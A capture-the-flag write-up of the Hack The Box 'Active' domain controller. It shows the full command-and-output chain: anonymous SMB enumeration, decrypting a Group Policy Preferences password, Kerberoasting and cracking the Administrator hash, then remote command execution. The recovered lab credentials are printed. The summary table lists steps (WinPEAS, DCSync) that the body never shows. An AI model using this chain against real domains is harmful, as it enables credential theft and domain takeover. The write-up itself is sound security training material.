---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Active

## Summary

[Active](https://app.hackthebox.com/machines/148) is an <mark style="color:green;">easy-rated</mark> box focused on **enumeration**. We are able to obtain a set of domain credentials by digging through the **SMB server**. This allows us to further **enumerate the domain** where we are able to find that the administrator's account is susceptible to [Kerberoasting](../../tl-dr/active-directory/attacks/kerberoasting.md), which leads to domain compromise.

<table><thead><tr><th width="85" align="right">Step</th><th width="189">Action</th><th width="247">Tool</th><th width="224">Achieved</th></tr></thead><tbody><tr><td align="right">1</td><td>SMB Enumeration</td><td><a href="../../tools/active-directory/netexec-cme.md">NetExec</a>, <a href="https://www.samba.org/samba/docs/current/man-html/smbclient.1.html">smbclient</a></td><td>Encrypted password</td></tr><tr><td align="right">2</td><td>Domain Enumeration</td><td><a href="../../tools/active-directory/netexec-cme.md">NetExec</a></td><td>Usernames</td></tr><tr><td align="right">3</td><td><a href="../../tl-dr/active-directory/attacks/kerberoasting.md">Kerberoasting</a></td><td><a href="https://github.com/BloodHoundAD/SharpHound">SharpHound.py</a>, <a href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a></td><td>Admin's hash</td></tr><tr><td align="right">4</td><td>System Enumeration</td><td><a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">WinPEAS</a></td><td>Privilege Escalation</td></tr><tr><td align="right">5</td><td><a href="../../tl-dr/active-directory/attacks/dcsync.md">DCSync</a></td><td><a href="../../tools/active-directory/netexec-cme.md">NetExec</a></td><td>Domain Compromise</td></tr></tbody></table>

## Information Gathering

Let's start with a port scan.

{% code overflow="wrap" %}
```bash
$ sudo nmap 10.10.10.100 -T4 -A -open -p-

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-03-17 17:23:25Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49170/tcp open  msrpc         Microsoft Windows RPC
49171/tcp open  msrpc         Microsoft Windows RPC

Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```
{% endcode %}

Some interesting things to note:

1. Services such as DNS, Kerberos, SMB, and LDAP let us know that this machine is a Domain Controller (DC).
2. The Fully Qualified Domain Name (FQDN) is `dc.active.htb` -> add this to our local DNS file (`/etc/hosts`).
3. There is no port that allows us to directly connect to the box, like WinRM, RDP, or SSH.&#x20;

```bash
# added domain to local DNS
$ grep active /etc/hosts
10.10.10.100    dc.active.htb active.htb dc
```

## Group Policy Preferences

We will focus on enumerating the SMB server first and see if we can see what shares are available.

{% code overflow="wrap" %}
```bash
$ nxc smb active.htb -u '' -p '' --shares
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\:********
SMB         10.10.10.100    445    DC               [*] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON                        Logon server share
SMB         10.10.10.100    445    DC               Replication     READ
SMB         10.10.10.100    445    DC               SYSVOL                          Logon server share
SMB         10.10.10.100    445    DC               Users
```
{% endcode %}

There are two non-default shares available, `Replication` and `Users`, but we can only `READ` the former. Let's see what's inside.

{% code overflow="wrap" %}
```bash
$ nxc smb active.htb -u '' -p '' --spider Replication --regex .
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\:********
SMB         10.10.10.100    445    DC               [*] Started spidering
SMB         10.10.10.100    445    DC               [*] Spidering .
SMB         10.10.10.100    445    DC               //10.10.10.100/Replication/. [dir]
SMB         10.10.10.100    445    DC               //10.10.10.100/Replication/.. [dir]
SMB         10.10.10.100    445    DC               //10.10.10.100/Replication/active.htb [dir]
SMB         10.10.10.100    445    DC               //10.10.10.100/Replication/active.htb/. [dir]
SMB         10.10.10.100    445    DC               //10.10.10.100/Replication/active.htb/.. [dir]
SMB         10.10.10.100    445    DC               //10.10.10.100/Replication/active.htb/DfsrPrivate [dir]
<SNIP>
SMB         10.10.10.100    445    DC               [*] Done spidering (Completed in 4.136066913604736)
```
{% endcode %}

There are a ton of things inside, so let's download everything and inspect it locally.

{% code overflow="wrap" %}
```bash
$ nxc smb active.htb -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=True
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\:********
SPIDER_P... 10.10.10.100    445    DC               [*] Started module spidering_plus with the following options:
SPIDER_P... 10.10.10.100    445    DC               [*]  DOWNLOAD_FLAG: True
SPIDER_P... 10.10.10.100    445    DC               [*]     STATS_FLAG: True
SPIDER_P... 10.10.10.100    445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_P... 10.10.10.100    445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_P... 10.10.10.100    445    DC               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_P... 10.10.10.100    445    DC               [*]  OUTPUT_FOLDER: /tmp/nxc_spider_plus
SMB         10.10.10.100    445    DC               [*] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON                        Logon server share
SMB         10.10.10.100    445    DC               Replication     READ
SMB         10.10.10.100    445    DC               SYSVOL                          Logon server share
SMB         10.10.10.100    445    DC               Users
SPIDER_P... 10.10.10.100    445    DC               [+] Saved share-file metadata to "/tmp/nxc_spider_plus/10.10.10.100.json".
SPIDER_P... 10.10.10.100    445    DC               [*] SMB Shares:           7 (ADMIN$, C$, IPC$, NETLOGON, Replication, SYSVOL, Users)
SPIDER_P... 10.10.10.100    445    DC               [*] SMB Readable Shares:  1 (Replication)
SPIDER_P... 10.10.10.100    445    DC               [*] Total folders found:  22
SPIDER_P... 10.10.10.100    445    DC               [*] Total files found:    7
SPIDER_P... 10.10.10.100    445    DC               [*] File size average:    1.16 KB
SPIDER_P... 10.10.10.100    445    DC               [*] File size min:        22 B
SPIDER_P... 10.10.10.100    445    DC               [*] File size max:        3.63 KB
SPIDER_P... 10.10.10.100    445    DC               [*] File unique exts:     4 (.pol, .ini, .xml, .inf)
SPIDER_P... 10.10.10.100    445    DC               [*] Downloads successful: 7
SPIDER_P... 10.10.10.100    445    DC               [+] All files processed successfully.

# getting a directory overview
$ tree 10.10.10.100/
10.10.10.100/
â””â”€â”€ Replication
    â””â”€â”€ active.htb
        â””â”€â”€ Policies
            â”œâ”€â”€ {31B2F340-016D-11D2-945F-00C04FB984F9}
            â”‚Â Â  â”œâ”€â”€ GPT.INI
            â”‚Â Â  â”œâ”€â”€ Group Policy
            â”‚Â Â  â”‚Â Â  â””â”€â”€ GPE.INI
            â”‚Â Â  â””â”€â”€ MACHINE
            â”‚Â Â      â”œâ”€â”€ Microsoft
            â”‚Â Â      â”‚Â Â  â””â”€â”€ Windows NT
            â”‚Â Â      â”‚Â Â      â””â”€â”€ SecEdit
            â”‚Â Â      â”‚Â Â          â””â”€â”€ GptTmpl.inf
            â”‚Â Â      â”œâ”€â”€ Preferences
            â”‚Â Â      â”‚Â Â  â””â”€â”€ Groups
            â”‚Â Â      â”‚Â Â      â””â”€â”€ Groups.xml
            â”‚Â Â      â””â”€â”€ Registry.pol
            â””â”€â”€ {6AC1786C-016F-11D2-945F-00C04fB984F9}
                â”œâ”€â”€ GPT.INI
                â””â”€â”€ MACHINE
                    â””â”€â”€ Microsoft
                        â””â”€â”€ Windows NT
                            â””â”€â”€ SecEdit
                                â””â”€â”€ GptTmpl.inf

17 directories, 7 files
```
{% endcode %}

This directory structure is usually found within the `SYSVOL` share which is a domain-wide share in Active Directory (AD) that any domain user can read. More specifically, we see the `Group Policy` directory which contains the interesting `Groups.xml` file. In general, the XML files found here are associated with [Group Policy Preferences (GPP)](https://learn.microsoft.com/en-us/troubleshoot/windows-server/group-policy/information-group-policy-preferences-events), a collection of Group Policy client-side extensions that specify computer and user configuration settings. In brief, **GPPs are used to store and use domain-related credentials**.&#x20;

As explained [here](https://adsecurity.org/?p=2288), the passwords within those XML files are stored in the `cpassword` field and are AES-256 encrypted which is considered safe...until [Microsoft published the AES private key](https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN)! Let's see if we can find one here.

{% code overflow="wrap" %}
```bash
# searching for the cpassword field
$ grep cpassword Groups.xml
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
```
{% endcode %}

Bingo! We found the AES-256 encrypted password of the `svc_tgs` account, which we can easily decrypt.

{% code overflow="wrap" %}
```bash
# decrypting the password
$ gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
GPPstillStandingStrong2k18
```
{% endcode %}

Let's confirm that these credentials actually work.

{% code overflow="wrap" %}
```bash
# validating credentials
$ nxc smb active.htb -u svc_tgs -p svc_tgs_pass
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\svc_tgs:********
```
{% endcode %}

## EoP via Kerberoasting

> _**EoP** stands for Elevation of Privileges_.

Now that we have the credentials of a valid domain user we can enumerate the domain further.

{% code overflow="wrap" %}
```bash
# enumerating share access
$ nxc smb active.htb -u svc_tgs -p svc_tgs_pass --shares
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\svc_tgs:********
SMB         10.10.10.100    445    DC               [*] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON        READ            Logon server share
SMB         10.10.10.100    445    DC               Replication     READ
SMB         10.10.10.100    445    DC               SYSVOL          READ            Logon server share
SMB         10.10.10.100    445    DC               Users           READ                                                 READ ONLY
```
{% endcode %}

Our user has access `READ` access to the second non-default share (`USERS`), so let's see what this contains and grab the first flag ðŸš© .

{% code overflow="wrap" %}
```bash
# enumerating the share
$ nxc smb 10.10.10.100 -u svc_tgs -p svc_tgs_pass --spider Users --regex . --depth 0
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\svc_tgs:********
SMB         10.10.10.100    445    DC               [-] Neo4J does not seem to be available on bolt://127.0.0.1:7687.
SMB         10.10.10.100    445    DC               [*] Started spidering
SMB         10.10.10.100    445    DC               [*] Spidering .
SMB         10.10.10.100    445    DC               //10.10.10.100/Users/. [dir]
SMB         10.10.10.100    445    DC               //10.10.10.100/Users/.. [dir]
SMB         10.10.10.100    445    DC               //10.10.10.100/Users/Administrator [dir]
SMB         10.10.10.100    445    DC               //10.10.10.100/Users/All Users [dir]
SMB         10.10.10.100    445    DC               //10.10.10.100/Users/Default [dir]
SMB         10.10.10.100    445    DC               //10.10.10.100/Users/Default User [dir]
SMB         10.10.10.100    445    DC               //10.10.10.100/Users/desktop.ini [lastm:'2018-07-16 22:01' size:174]
SMB         10.10.10.100    445    DC               //10.10.10.100/Users/Public [dir]
SMB         10.10.10.100    445    DC               //10.10.10.100/Users/SVC_TGS [dir]
SMB         10.10.10.100    445    DC               [*] Done spidering (Completed in 0.15805459022521973)
# search for TXT files
$ nxc smb 10.10.10.100 -u svc_tgs -p svc_tgs_pass --spider Users --pattern txt
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\svc_tgs:********
SMB         10.10.10.100    445    DC               [-] Neo4J does not seem to be available on bolt://127.0.0.1:7687.
SMB         10.10.10.100    445    DC               [*] Started spidering
SMB         10.10.10.100    445    DC               [*] Spidering .
SMB         10.10.10.100    445    DC               //10.10.10.100/Users/SVC_TGS/Desktop/user.txt [lastm:'2024-03-26 06:26' size:34]
SMB         10.10.10.100    445    DC               [*] Done spidering (Completed in 9.01361608505249)
# download the flag
$ nxc smb 10.10.10.100 -u svc_tgs -p svc_tgs_pass --share Users --get-file SVC_TGS/Desktop/user.txt user.txt
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\svc_tgs:********
SMB         10.10.10.100    445    DC               [-] Neo4J does not seem to be available on bolt://127.0.0.1:7687.
SMB         10.10.10.100    445    DC               [*] Copying "SVC_TGS/Desktop/user.txt" to "user.txt"
SMB         10.10.10.100    445    DC               [+] File "SVC_TGS/Desktop/user.txt" was downloaded to "user.txt"
```
{% endcode %}

Next, we can enumerate domain users.

{% code overflow="wrap" %}
```bash
$ nxc smb active.htb -u svc_tgs -p svc_tgs_pass --users
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\svc_tgs:********
SMB         10.10.10.100    445    DC               [*] Trying to dump local users with SAMRPC protocol
SMB         10.10.10.100    445    DC               [+] Enumerated domain user(s)
SMB         10.10.10.100    445    DC               active.htb\Administrator                  Built-in account for administering the computer/domain
SMB         10.10.10.100    445    DC               active.htb\Guest                          Built-in account for guest access to the computer/domain
SMB         10.10.10.100    445    DC               active.htb\krbtgt                         Key Distribution Center Service Account
SMB         10.10.10.100    445    DC               active.htb\SVC_TGS
```
{% endcode %}

With a small userlist at hand, we can check if any account is vulnerable to [ASREPRoasting](../../tl-dr/active-directory/attacks/asreproasting.md) or [Kerberoasting](../../tl-dr/active-directory/attacks/kerberoasting.md).

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong># create a username list
</strong><strong>$ cat users.txt
</strong>administrator
guest
krbtgt

# check for asreproasting
$ nxc ldap active.htb -u users.txt -p '' --asreproast asreproastable_accounts.txt
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)

# check for kerberoasting
$ nxc ldap active.htb -u svc_tgs -p svc_tgs_pass --kerberoasting kerberoastable_accounts.txt
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
LDAP        10.10.10.100    389    DC               [+] active.htb\svc_tgs:********
LDAP        10.10.10.100    389    DC               [-] Neo4J does not seem to be available on bolt://127.0.0.1:7687.
LDAP        10.10.10.100    389    DC               [*] Total of records returned 1
LDAP        10.10.10.100    389    DC               sAMAccountName: Administrator memberOf: CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb pwdLastSet: 2018-07-18 20:06:40.351723 lastLogon:2024-03-25 20:25:51.324958
LDAP        10.10.10.100    389    DC               $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$993717228a597fba3ce3709916d6c0cb$c85329b883d02e9e12f732731e5469ca7655604859fb597595ae8debd55a0b7dd23654eb04f29990379744319dd59645a2ee1bc05226731da547cf074eb795f515077a9155b86294ebffe78d914512c633e22b032c402384351e063c29fb17f03ab14b1048f2e9c6a42e327f303389f23783b5792887879b41b8ecbf12d21ccf14956927f6f751f46cd795ecdf9efcb0ac2d89ecd93cc7d04884c309fa1d59d08de12f19c010f0242a10c3bf270b0759ef4edb65c0d5f7ac986e4bfe6e40b55406b1210583d0dc1dd45bff1a889334b38b6b8c39a3e9ff0cea462cf93fc2ff866b1871e4610de449d46e5e52f1ba63d25c9aa5cd9e47fd31123cf4052e3ee494420090f6fac6fc6c048d9d4bb822d9411ac153d158ea59d9b9d28e3116cd6b0983fd3182071699be9a5a790667f46c71652e2604eb1a198d77156f19e4cd64c65702567ba8c0577e7efbc89ee2314eab68e1ba2ac47e0dc45d014f9347a9a5b0032c7a48afcdc38d83415d96f29428e190bfbb559e3e5baa4db726d9fcd9e875ca8d4ae729957fd347716309927720beef6e543e22247d74fda70f21c232a70eda722e472a4815defbb7a78f09084ebfc3ec0a84ffae9344c41ee9fe67e7402c66f81a9dc3e3baabcb73a9fc7d5958c0133198a146d1fc689801efdf098a540515f936306ad5811cbae5179f7a76ca5ebfdf6a16dd7065ee2972fcbcf09512174d602fff80c4eed7216b9afa87ee495f7207bcff1d433f5ceed30771a6efabfd5b7289f812a689c32b333f99d9decdf3bb74a7740af58897d72b04eb37065e5068c61a297d604bfc77139a883214869e92797c9c251f1aca6314c54be805ed1818e94b4e0272c3c8629a9d93130e13e726d032f8e48ccdfc34ddc07e398b67bb31810c274d8e32c5b7e693f13e84841019cee7e683de31d0953c6c9ecae12fc4ccbaa9970a24e1fd6e607e27df0f083b91ce52f370690d9b7ff6897590f13549b772f3d3c264167ffbee44261bb694bea5dc3439fe57c2dc4b2601f4e48cd2c6a2d1d472e4c9a318c2f0e48d99837667416e07d6135b72f3a8eec2e824f0bd5fea4e77ee04dc32f19346521c38c055212f48ac40b9e9912d1ac3eab0998b136e3465fc98e96b68ed7988755a990b5a0cd1db7e04d3e7f3b94d4dd4208b2cbafd15130f32a722cfb58927ca59d76c9bbd5dd27af515e5c44d2e8e2054528467c87db16beb33f04ba457f0b6f0a31ee0c5a6d81da0a14ced1647f3
</code></pre>

We are in luck! The `administrator` account was kerberoasted! Let's crack the hash.

{% code overflow="wrap" %}
```bash
# detect appropriate mode with auto-detect
$ hashcat admin_tgs_hash
<SNIP>
The following mode was auto-detected as the only one matching your input hash:

13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol

# crack hash
$ hashcat kerberoastable_accounts.txt /usr/share/wordlists/rockyou.txt

<SNIP>

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$682<SNIP>399:Ticketmaster1968

<SNIP>
```
{% endcode %}

We can use the administrator account and grab the root flag ðŸš©.

{% code overflow="wrap" %}
```bash
# command execution via netexec
$ nxc smb active.htb -u administrator -p admin_pass -X 'gc c:\users\administrator\desktop\root.txt'
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\administrator:******** (Pwn3d!)
SMB         10.10.10.100    445    DC               [+] Executed command via wmiexec
SMB         10.10.10.100    445    DC               585<REDACTED>d60
```
{% endcode %}

## Extra

If we had valid domain credentials, we could have used the NetExec module `gpp_password` to enumerate and automatically decrypt passwords stored in GPP XML files:

{% code overflow="wrap" %}
```bash
$ nxc smb active.htb -u administrator -p admin_pass -M gpp_password
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\administrator:******** (Pwn3d!)
SMB         10.10.10.100    445    DC               [-] Neo4J does not seem to be available on bolt://127.0.0.1:7687.
SMB         10.10.10.100    445    DC               [-] Neo4J does not seem to be available on bolt://127.0.0.1:7687.
SMB         10.10.10.100    445    DC               [*] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$          READ,WRITE      Remote Admin
SMB         10.10.10.100    445    DC               C$              READ,WRITE      Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON        READ,WRITE      Logon server share
SMB         10.10.10.100    445    DC               Replication     READ
SMB         10.10.10.100    445    DC               SYSVOL          READ            Logon server share
SMB         10.10.10.100    445    DC               Users           READ
GPP_PASS... 10.10.10.100    445    DC               [+] Found SYSVOL share
GPP_PASS... 10.10.10.100    445    DC               [*] Searching for potential XML files containing passwords
SMB         10.10.10.100    445    DC               [*] Started spidering
SMB         10.10.10.100    445    DC               [*] Spidering .
SMB         10.10.10.100    445    DC               //10.10.10.100/SYSVOL/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml [lastm:'2018-07-18 21:46' size:533]
SMB         10.10.10.100    445    DC               [*] Done spidering (Completed in 4.176591873168945)
GPP_PASS... 10.10.10.100    445    DC               [*] Found active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
GPP_PASS... 10.10.10.100    445    DC               [+] Found credentials in active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
GPP_PASS... 10.10.10.100    445    DC               Password: GPPstillStandingStrong2k18
GPP_PASS... 10.10.10.100    445    DC               action: U
GPP_PASS... 10.10.10.100    445    DC               newName:
GPP_PASS... 10.10.10.100    445    DC               fullName:
GPP_PASS... 10.10.10.100    445    DC               description:
GPP_PASS... 10.10.10.100    445    DC               changeLogon: 0
GPP_PASS... 10.10.10.100    445    DC               noChange: 1
GPP_PASS... 10.10.10.100    445    DC               neverExpires: 1
GPP_PASS... 10.10.10.100    445    DC               acctDisabled: 0
GPP_PASS... 10.10.10.100    445    DC               userName: active.htb\SVC_TGS
```
{% endcode %}

## Resources

{% tabs %}
{% tab title="Exploiting GPPs" %}
{% embed url="https://adsecurity.org/?p=2288" %}
{% endtab %}
{% endtabs %}
